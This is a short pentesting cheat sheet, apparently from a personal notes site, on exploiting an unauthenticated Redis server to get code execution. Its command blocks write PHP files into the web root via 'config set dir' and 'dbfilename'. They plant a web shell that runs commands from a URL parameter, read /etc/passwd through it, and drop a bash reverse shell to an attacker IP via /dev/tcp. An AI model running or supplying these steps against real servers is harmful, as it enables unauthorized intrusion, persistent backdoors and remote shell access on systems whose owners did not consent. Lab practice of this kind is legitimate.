---
title: Redis database 🦈
---

# How to deal with a Redis database?

- Download redis-tools: `sudo apt install redis-tools`
- Use the following command to gather info: `info`
- Introduce a php RCE:

```shell
redis-cli -h 10.10.60.159
10.10.60.159:6379> config set dir /var/www/html
OK
10.10.60.159:6379> config set dbfilename redis.php
OK
10.10.60.159:6379> set test "<?php phpinfo(); ?>"
OK
10.10.60.159:6379> save
OK
```

- Now in Firefox, navigate to `<target-ip>/redis.php`
- If it is shown the phpinfo() file, the try to run this to get a shell:

```shell
redis-cli -h 10.10.60.159
10.10.60.159:6379> config set dir /var/www/html
OK
10.10.60.159:6379> config set dbfilename redisshell.php
OK
10.10.60.159:6379> set test "<?php system($_GET['cmd']); ?>"
OK
10.10.60.159:6379> save
OK
```

- Now on the web-nav put something like this: `view-source:http://10.10.60.159/redisshell.php?cmd=%20cat%20/etc/passwd`
- Now set up a listener and create a simple reverse php shell:

```shell
redis-cli -h 10.10.60.159
10.10.60.159:6379> config set dir /var/www/html
OK
10.10.60.159:6379> config set dbfilename redisshell.php
OK
10.10.60.159:6379> set test "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/<attck-ip>/<port> 0>&1'\"); ?>"
OK
10.10.60.159:6379> save
OK
```
